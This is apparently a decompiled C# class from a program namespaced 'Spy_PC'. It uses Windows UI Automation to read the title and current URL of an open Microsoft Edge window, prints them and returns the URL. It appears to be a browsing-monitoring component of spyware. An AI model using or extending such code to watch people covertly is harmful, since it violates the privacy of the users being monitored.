using System;
using System.Runtime.InteropServices;
using System.Windows.Automation;

namespace Spy_PC;

internal class EdgeBrowser
{
	public string GetDetails()
	{
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Expected O, but got Unknown
		foreach (AutomationElement item in AutomationElement.FromHandle(GetDesktopWindow()).FindAll((TreeScope)2, Condition.TrueCondition))
		{
			AutomationElement edgeWindow = item;
			AutomationElement edgeCommandsWindow = GetEdgeCommandsWindow(edgeWindow);
			if (!(edgeCommandsWindow == (AutomationElement)null))
			{
				Console.WriteLine("TITLE:" + GetEdgeTitle(edgeWindow));
				Console.WriteLine("URL:" + GetEdgeUrl(edgeCommandsWindow));
				return GetEdgeUrl(edgeCommandsWindow);
			}
		}
		return "";
	}

	public static AutomationElement GetEdgeCommandsWindow(AutomationElement edgeWindow)
	{
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		//IL_001a: Expected O, but got Unknown
		//IL_0026: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0036: Expected O, but got Unknown
		return edgeWindow.FindFirst((TreeScope)2, (Condition)new AndCondition((Condition[])(object)new Condition[2]
		{
			(Condition)new PropertyCondition(AutomationElement.ControlTypeProperty, (object)ControlType.Window),
			(Condition)new PropertyCondition(AutomationElement.NameProperty, (object)"Microsoft Edge")
		}));
	}

	public static string GetEdgeUrl(AutomationElement edgeCommandsWindow)
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0020: Unknown result type (might be due to invalid IL or missing references)
		return ((TextPattern)edgeCommandsWindow.FindFirst((TreeScope)2, (Condition)new PropertyCondition(AutomationElement.AutomationIdProperty, (object)"addressEditBox")).GetCurrentPattern(TextPattern.Pattern)).get_DocumentRange().GetText(int.MaxValue);
	}

	public static string GetEdgeTitle(AutomationElement edgeWindow)
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		AutomationElementInformation current = edgeWindow.FindFirst((TreeScope)2, (Condition)new PropertyCondition(AutomationElement.AutomationIdProperty, (object)"TitleBar")).get_Current();
		return ((AutomationElementInformation)(ref current)).get_Name();
	}

	[DllImport("user32")]
	public static extern IntPtr GetDesktopWindow();
}
